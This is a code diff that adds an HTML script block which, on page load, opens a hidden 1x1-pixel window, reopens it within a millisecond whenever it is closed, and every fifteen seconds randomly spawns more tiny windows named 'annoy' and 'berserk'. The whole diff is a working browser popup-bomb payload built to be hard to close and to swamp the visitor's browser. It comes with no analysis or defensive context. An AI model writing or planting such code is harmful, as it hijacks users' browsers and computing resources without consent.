@@ -1,0 +1,30 @@
+<script>
+    var w = window.open('hidden2.html','','HEIGHT=1,WIDTH=1');
+            setInterval(() => {
+                if(w.closed) {
+                    w = window.open('hidden2.html','','HEIGHT=1,WIDTH=1');
+                }
+            },1);
+            onfocus = () => {
+                open();
+            }
+            open();
+    function RB(min, max) {
+        return Math.floor(Math.random() * (max - min + 1) + min);
+    }
+    var max = 5;
+    setInterval(() => {
+        if(RB(1,max) == 1) {
+            window.open('window.html','','HEIGHT=1,WIDTH=1');
+        } else if(RB(1,max) == 2) {
+            window.open('annoy.html','','HEIGHT=1,WIDTH=1');
+        } else if(RB(1,max) == 3) {
+            for(let i = 0; i < RB(1,5); i++) {
+                window.open('berserk.html','','HEIGHT=1,WIDTH=1');
+            }
+        }
+    },15000);
+    onfocus = () => {
+        open();
+    }
+</script>
